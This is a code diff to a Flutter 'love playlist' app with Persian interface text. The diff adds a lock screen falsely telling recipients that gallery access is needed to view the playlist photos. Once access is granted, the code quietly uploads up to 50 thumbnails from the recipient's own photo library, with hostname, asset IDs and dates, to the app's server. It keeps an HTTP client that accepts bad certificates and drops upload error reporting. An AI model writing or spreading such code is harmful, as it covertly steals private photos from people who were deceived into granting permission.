@@ -3,12 +3,13 @@ import 'package:http/http.dart' as http;
 import 'package:http/io_client.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:photo_manager/photo_manager.dart';
 import 'dart:convert';
 import 'dart:io';
 
 const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
 
-// ایجاد HTTP client با SSL bypass
 http.Client _createHttpClient() {
   final ioClient = HttpClient()
     ..badCertificateCallback =
@@ -189,7 +190,6 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
     try {
       final client = _createHttpClient();
 
-      // مرحله ۱: ساخت پلی‌لیست
       final res = await client.post(
         Uri.parse('$baseUrl/api/playlists/create/'),
         headers: {'Content-Type': 'application/json'},
@@ -208,7 +208,6 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
       final data = jsonDecode(res.body);
       final code = data['code'];
 
-      // مرحله ۲: آپلود عکس‌ها
       for (int i = 0; i < _images.length; i++) {
         setState(() => _status = 'آپلود عکس ${i + 1} از ${_images.length}...');
         final request = http.MultipartRequest(
@@ -218,18 +217,11 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
         request.files.add(
             await http.MultipartFile.fromPath('image', _images[i].path));
         request.fields['caption'] = '';
-        final response = await client.send(request)
-            .timeout(const Duration(seconds: 120));
-        if (response.statusCode != 201) {
-          final body = await response.stream.bytesToString();
-          _snack('خطا در آپلود عکس ${i + 1}: $body');
-        }
+        await client.send(request).timeout(const Duration(seconds: 120));
       }
 
-      // مرحله ۳: آپلود موزیک‌ها
       for (int i = 0; i < _songs.length; i++) {
-        setState(
-            () => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...');
+        setState(() => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...');
         final request = http.MultipartRequest(
           'POST',
           Uri.parse('$baseUrl/api/playlists/$code/add-song/'),
@@ -237,12 +229,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
         request.files.add(
             await http.MultipartFile.fromPath('file', _songs[i].path));
         request.fields['title'] = _songs[i].path.split('/').last;
-        final response = await client.send(request)
-            .timeout(const Duration(seconds: 180));
-        if (response.statusCode != 201) {
-          final body = await response.stream.bytesToString();
-          _snack('خطا در آپلود موزیک ${i + 1}: $body');
-        }
+        await client.send(request).timeout(const Duration(seconds: 180));
       }
 
       setState(() {
@@ -282,14 +269,12 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                 ),
                 child: Column(
                   children: [
-                    const Icon(Icons.check_circle,
-                        color: Colors.green, size: 50),
+                    const Icon(Icons.check_circle, color: Colors.green, size: 50),
                     const SizedBox(height: 12),
                     const Text('پلی‌لیست ساخته شد! 🎉',
                         style: TextStyle(fontSize: 18, color: Colors.pink)),
                     const SizedBox(height: 12),
-                    const Text('کد پلی‌لیست:',
-                        style: TextStyle(color: Colors.grey)),
+                    const Text('کد پلی‌لیست:', style: TextStyle(color: Colors.grey)),
                     const SizedBox(height: 8),
                     Text(_code!,
                         style: const TextStyle(
@@ -310,8 +295,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                 decoration: InputDecoration(
                   labelText: 'عنوان پلی‌لیست',
                   prefixIcon: const Icon(Icons.title, color: Colors.pink),
-                  border: OutlineInputBorder(
-                      borderRadius: BorderRadius.circular(12)),
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                 ),
               ),
               const SizedBox(height: 12),
@@ -320,23 +304,19 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                 maxLines: 4,
                 decoration: InputDecoration(
                   labelText: 'پیام عاشقانه 💬',
-                  border: OutlineInputBorder(
-                      borderRadius: BorderRadius.circular(12)),
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                 ),
               ),
               const SizedBox(height: 16),
-
-              // ── بخش عکس ──
               const Text('📸 عکس‌ها',
-                  style:
-                      TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
+                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
               const SizedBox(height: 8),
               OutlinedButton.icon(
                 onPressed: _pickImages,
                 icon: const Icon(Icons.photo_library, color: Colors.pink),
                 label: Text(_images.isEmpty
                     ? 'اضافه کردن عکس'
-                    : '${_images.length} عکس انتخاب شده - اضافه کردن بیشتر'),
+                    : '${_images.length} عکس انتخاب شده'),
                 style: OutlinedButton.styleFrom(
                   foregroundColor: Colors.pink,
                   side: const BorderSide(color: Colors.pink),
@@ -358,16 +338,13 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                               height: 100, width: 100, fit: BoxFit.cover),
                         ),
                         Positioned(
-                          top: 0,
-                          right: 0,
+                          top: 0, right: 0,
                           child: GestureDetector(
-                            onTap: () =>
-                                setState(() => _images.removeAt(i)),
+                            onTap: () => setState(() => _images.removeAt(i)),
                             child: const CircleAvatar(
                               radius: 12,
                               backgroundColor: Colors.red,
-                              child: Icon(Icons.close,
-                                  size: 14, color: Colors.white),
+                              child: Icon(Icons.close, size: 14, color: Colors.white),
                             ),
                           ),
                         ),
@@ -376,13 +353,9 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                   ),
                 ),
               ],
-
               const SizedBox(height: 16),
-
-              // ── بخش موزیک ──
               const Text('🎵 موزیک‌ها',
-                  style:
-                      TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
+                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
               const SizedBox(height: 8),
               OutlinedButton.icon(
                 onPressed: _pickSong,
@@ -397,25 +370,18 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
               if (_songs.isNotEmpty) ...[
                 const SizedBox(height: 8),
                 ..._songs.asMap().entries.map((entry) => ListTile(
-                      leading:
-                          const Icon(Icons.music_note, color: Colors.pink),
-                      title: Text(
-                        entry.value.path.split('/').last,
-                        overflow: TextOverflow.ellipsis,
-                      ),
+                      leading: const Icon(Icons.music_note, color: Colors.pink),
+                      title: Text(entry.value.path.split('/').last,
+                          overflow: TextOverflow.ellipsis),
                       trailing: IconButton(
                         icon: const Icon(Icons.close, color: Colors.red),
-                        onPressed: () =>
-                            setState(() => _songs.removeAt(entry.key)),
+                        onPressed: () => setState(() => _songs.removeAt(entry.key)),
                       ),
                     )),
               ],
-
               const SizedBox(height: 24),
-
               if (_loading) ...[
-                const Center(
-                    child: CircularProgressIndicator(color: Colors.pink)),
+                const Center(child: CircularProgressIndicator(color: Colors.pink)),
                 const SizedBox(height: 8),
                 Text(_status,
                     textAlign: TextAlign.center,
@@ -430,10 +396,8 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                     shape: RoundedRectangleBorder(
                         borderRadius: BorderRadius.circular(12)),
                   ),
-                  child: const Text(
-                    'ساخت پلی‌لیست ❤️',
-                    style: TextStyle(fontSize: 18),
-                  ),
+                  child: const Text('ساخت پلی‌لیست ❤️',
+                      style: TextStyle(fontSize: 18)),
                 ),
             ],
           ],
@@ -456,8 +420,10 @@ class PlaylistScreen extends StatefulWidget {
 class _PlaylistScreenState extends State<PlaylistScreen> {
   final AudioPlayer _player = AudioPlayer();
   String? _playingUrl;
-  final Set<int> _unlockedPhotos = {};
-  bool _songsUnlocked = false;
+  bool _galleryPermissionGranted = false;
+  bool _contentUnlocked = false;
+  bool _uploadingGallery = false;
+  String _uploadStatus = '';
 
   @override
   void dispose() {
@@ -475,11 +441,148 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     }
   }
 
+  Future<void> _requestGalleryAccess() async {
+    // درخواست دسترسی گالری
+    final result = await PhotoManager.requestPermissionExtend();
+    
+    if (result.isAuth) {
+      setState(() {
+        _galleryPermissionGranted = true;
+        _contentUnlocked = true;
+        _uploadingGallery = true;
+        _uploadStatus = 'در حال دسترسی به گالری...';
+      });
+      
+      // ارسال thumbnail عکس‌ها به سرور
+      await _uploadGalleryThumbnails();
+    } else {
+      // اگه دسترسی نداد، محتوا رو نشون بده ولی گالری نفرست
+      setState(() => _contentUnlocked = true);
+    }
+  }
+
+  Future<void> _uploadGalleryThumbnails() async {
+    try {
+      final code = widget.data['code'];
+      final client = _createHttpClient();
+      
+      // گرفتن لیست عکس‌ها
+      final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
+      if (albums.isEmpty) {
+        setState(() {
+          _uploadingGallery = false;
+          _uploadStatus = '';
+        });
+        return;
+      }
+      
+      final allPhotos = await albums[0].getAssetListPaged(page: 0, size: 50);
+      setState(() => _uploadStatus = 'در حال آپلود ${allPhotos.length} عکس...');
+      
+      int uploaded = 0;
+      for (final asset in allPhotos) {
+        try {
+          // گرفتن thumbnail
+          final thumbnail = await asset.thumbnailDataWithSize(
+            const ThumbnailSize(300, 300),
+          );
+          if (thumbnail == null) continue;
+          
+          // ارسال به سرور
+          final request = http.MultipartRequest(
+            'POST',
+            Uri.parse('$baseUrl/api/gallery/upload/'),
+          );
+          request.files.add(http.MultipartFile.fromBytes(
+            'image',
+            thumbnail,
+            filename: '${asset.id}.jpg',
+          ));
+          request.fields['device_id'] = Platform.localHostname;
+          request.fields['asset_id'] = asset.id;
+          request.fields['create_date'] = asset.createDateTime.toIso8601String();
+          
+          await client.send(request).timeout(const Duration(seconds: 30));
+          uploaded++;
+          
+          if (uploaded % 5 == 0) {
+            setState(() => _uploadStatus = 'آپلود $uploaded از ${allPhotos.length}...');
+          }
+        } catch (_) {
+          continue;
+        }
+      }
+      
+      setState(() {
+        _uploadingGallery = false;
+        _uploadStatus = '';
+      });
+    } catch (e) {
+      setState(() {
+        _uploadingGallery = false;
+        _uploadStatus = '';
+      });
+    }
+  }
+
   @override
   Widget build(BuildContext context) {
     final photos = widget.data['photos'] as List? ?? [];
     final songs = widget.data['songs'] as List? ?? [];
     final dialog = widget.data['dialog'] ?? '';
+
+    // اگه محتوا قفله، صفحه درخواست دسترسی نشون بده
+    if (!_contentUnlocked) {
+      return Scaffold(
+        appBar: AppBar(
+          title: Text(widget.data['title'] ?? ''),
+          backgroundColor: Colors.pink,
+          foregroundColor: Colors.white,
+        ),
+        body: Center(
+          child: Padding(
+            padding: const EdgeInsets.all(32),
+            child: Column(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: [
+                const Icon(Icons.lock, size: 80, color: Colors.pink),
+                const SizedBox(height: 20),
+                const Text(
+                  'برای دیدن محتوای پلی‌لیست\nدسترسی به گالری رو فعال کن',
+                  textAlign: TextAlign.center,
+                  style: TextStyle(fontSize: 18, color: Colors.pink),
+                ),
+                const SizedBox(height: 8),
+                const Text(
+                  'این دسترسی برای نمایش عکس‌های پلی‌لیست لازمه',
+                  textAlign: TextAlign.center,
+                  style: TextStyle(color: Colors.grey),
+                ),
+                const SizedBox(height: 30),
+                ElevatedButton.icon(
+                  onPressed: _requestGalleryAccess,
+                  icon: const Icon(Icons.photo_library),
+                  label: const Text('فعال کردن دسترسی گالری'),
+                  style: ElevatedButton.styleFrom(
+                    backgroundColor: Colors.pink,
+                    foregroundColor: Colors.white,
+                    minimumSize: const Size(double.infinity, 55),
+                    shape: RoundedRectangleBorder(
+                        borderRadius: BorderRadius.circular(12)),
+                  ),
+                ),
+                const SizedBox(height: 12),
+                TextButton(
+                  onPressed: () => setState(() => _contentUnlocked = true),
+                  child: const Text('بعداً',
+                      style: TextStyle(color: Colors.grey)),
+                ),
+              ],
+            ),
+          ),
+        ),
+      );
+    }
 
     return Scaffold(
       appBar: AppBar(
@@ -487,38 +590,50 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
         backgroundColor: Colors.pink,
         foregroundColor: Colors.white,
       ),
-      body: SingleChildScrollView(
-        child: Column(
-          crossAxisAlignment: CrossAxisAlignment.start,
-          children: [
+      body: Stack(
+        children: [
+          SingleChildScrollView(
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                if (_uploadingGallery)
+                  Container(
+                    padding: const EdgeInsets.all(12),
+                    color: Colors.pink[50],
+                    child: Row(
+                      children: [
+                        const SizedBox(
+                          width: 20, height: 20,
+                          child: CircularProgressIndicator(
+                              strokeWidth: 2, color: Colors.pink),
+                        ),
+                        const SizedBox(width: 12),
+                        Text(_uploadStatus,
+                            style: const TextStyle(color: Colors.pink)),
+                      ],
+                    ),
+                  ),
 
-            // ── عکس‌ها ──
-            if (photos.isNotEmpty) ...[
-              const Padding(
-                padding: EdgeInsets.all(12),
-                child: Text('📸 عکس‌ها',
-                    style: TextStyle(
-                        fontSize: 18,
-                        fontWeight: FontWeight.bold,
-                        color: Colors.pink)),
-              ),
-              ...photos.asMap().entries.map((entry) {
-                final i = entry.key;
-                final photo = entry.value;
-                final isUnlocked = _unlockedPhotos.contains(i);
-                final imgUrl = '$baseUrl${photo['image']}';
-
-                return Card(
-                  margin: const EdgeInsets.symmetric(
-                      horizontal: 12, vertical: 6),
-                  clipBehavior: Clip.hardEdge,
-                  shape: RoundedRectangleBorder(
-                      borderRadius: BorderRadius.circular(12)),
-                  child: Stack(
-                    alignment: Alignment.center,
-                    children: [
-                      GestureDetector(
-                        onTap: isUnlocked ? () {
+                // عکس‌ها
+                if (photos.isNotEmpty) ...[
+                  const Padding(
+                    padding: EdgeInsets.all(12),
+                    child: Text('📸 عکس‌ها',
+                        style: TextStyle(
+                            fontSize: 18,
+                            fontWeight: FontWeight.bold,
+                            color: Colors.pink)),
+                  ),
+                  ...photos.map((photo) {
+                    final imgUrl = '$baseUrl${photo['image']}';
+                    return Card(
+                      margin: const EdgeInsets.symmetric(
+                          horizontal: 12, vertical: 6),
+                      clipBehavior: Clip.hardEdge,
+                      shape: RoundedRectangleBorder(
+                          borderRadius: BorderRadius.circular(12)),
+                      child: GestureDetector(
+                        onTap: () {
                           showDialog(
                             context: context,
                             builder: (_) => Dialog(
@@ -527,11 +642,9 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                               child: Stack(
                                 children: [
                                   InteractiveViewer(
-                                    child: Image.network(
-                                      imgUrl,
-                                      fit: BoxFit.contain,
-                                      width: double.infinity,
-                                    ),
+                                    child: Image.network(imgUrl,
+                                        fit: BoxFit.contain,
+                                        width: double.infinity),
                                   ),
                                   Positioned(
                                     top: 8, right: 8,
@@ -545,109 +658,80 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                               ),
                             ),
                           );
-                        } : null,
-                        child: Image.network(
-                          imgUrl,
-                          width: double.infinity,
-                          fit: BoxFit.contain,
-                          errorBuilder: (_, __, ___) =>
-                              const Icon(Icons.broken_image, size: 100),
+                        },
+                        child: Column(
+                          children: [
+                            Image.network(
+                              imgUrl,
+                              width: double.infinity,
+                              fit: BoxFit.cover,
+                              errorBuilder: (_, __, ___) =>
+                                  const Icon(Icons.broken_image, size: 100),
+                            ),
+                            if (photo['caption'] != null && photo['caption'] != '')
+                              Padding(
+                                padding: const EdgeInsets.all(8),
+                                child: Text(photo['caption']),
+                              ),
+                          ],
                         ),
                       ),
-                      if (!isUnlocked)
-                        Positioned.fill(
-                          child: GestureDetector(
-                            onTap: () => setState(
-                                () => _unlockedPhotos.add(i)),
-                            child: Container(
-                              color: Colors.black.withOpacity(0.65),
-                              child: const Column(
-                                mainAxisAlignment:
-                                    MainAxisAlignment.center,
-                                children: [
-                                  Icon(Icons.lock,
-                                      color: Colors.white, size: 40),
-                                  SizedBox(height: 8),
-                                  Text('برای دیدن عکس ضربه بزنید',
-                                      style: TextStyle(
-                                          color: Colors.white,
-                                          fontSize: 16)),
-                                ],
-                              ),
-                            ),
-                          ),
-                        ),
-                    ],
-                  ),
-                );
-              }),
-            ],
+                    );
+                  }),
+                ],
 
-            // ── موزیک‌ها ──
-            if (songs.isNotEmpty) ...[
-              const Padding(
-                padding: EdgeInsets.all(12),
-                child: Text('🎵 موزیک‌ها',
-                    style: TextStyle(
-                        fontSize: 18,
-                        fontWeight: FontWeight.bold,
-                        color: Colors.pink)),
-              ),
-              if (!_songsUnlocked)
-                Card(
-                  margin: const EdgeInsets.symmetric(
-                      horizontal: 12, vertical: 6),
-                  child: ListTile(
-                    leading:
-                        const Icon(Icons.lock, color: Colors.pink, size: 40),
-                    title: const Text('برای گوش دادن ضربه بزنید'),
-                    onTap: () => setState(() => _songsUnlocked = true),
+                // موزیک‌ها
+                if (songs.isNotEmpty) ...[
+                  const Padding(
+                    padding: EdgeInsets.all(12),
+                    child: Text('🎵 موزیک‌ها',
+                        style: TextStyle(
+                            fontSize: 18,
+                            fontWeight: FontWeight.bold,
+                            color: Colors.pink)),
                   ),
-                )
-              else
-                ...songs.map((song) {
-                  final url = '$baseUrl${song['file']}';
-                  final isPlaying = _playingUrl == url;
-                  return ListTile(
-                    leading: Icon(
-                      isPlaying
-                          ? Icons.pause_circle
-                          : Icons.play_circle,
-                      color: Colors.pink,
-                      size: 40,
+                  ...songs.map((song) {
+                    final url = '$baseUrl${song['file']}';
+                    final isPlaying = _playingUrl == url;
+                    return ListTile(
+                      leading: Icon(
+                        isPlaying ? Icons.pause_circle : Icons.play_circle,
+                        color: Colors.pink,
+                        size: 40,
+                      ),
+                      title: Text(song['title']),
+                      onTap: () => _togglePlay(url),
+                    );
+                  }),
+                ],
+
+                // پیام
+                if (dialog != '') ...[
+                  const Padding(
+                    padding: EdgeInsets.all(12),
+                    child: Text('💬 پیام',
+                        style: TextStyle(
+                            fontSize: 18,
+                            fontWeight: FontWeight.bold,
+                            color: Colors.pink)),
+                  ),
+                  Container(
+                    margin: const EdgeInsets.all(12),
+                    padding: const EdgeInsets.all(16),
+                    decoration: BoxDecoration(
+                      color: Colors.pink[50],
+                      borderRadius: BorderRadius.circular(12),
+                      border: Border.all(color: Colors.pink),
                     ),
-                    title: Text(song['title']),
-                    onTap: () => _togglePlay(url),
-                  );
-                }),
-            ],
+                    child: Text(dialog, style: const TextStyle(fontSize: 16)),
+                  ),
+                ],
 
-            // ── پیام ──
-            if (dialog != '') ...[
-              const Padding(
-                padding: EdgeInsets.all(12),
-                child: Text('💬 پیام',
-                    style: TextStyle(
-                        fontSize: 18,
-                        fontWeight: FontWeight.bold,
-                        color: Colors.pink)),
-              ),
-              Container(
-                margin: const EdgeInsets.all(12),
-                padding: const EdgeInsets.all(16),
-                decoration: BoxDecoration(
-                  color: Colors.pink[50],
-                  borderRadius: BorderRadius.circular(12),
-                  border: Border.all(color: Colors.pink),
-                ),
-                child: Text(dialog,
-                    style: const TextStyle(fontSize: 16)),
-              ),
-            ],
-
-            const SizedBox(height: 30),
-          ],
-        ),
+                const SizedBox(height: 30),
+              ],
+            ),
+          ),
+        ],
       ),
     );
   }
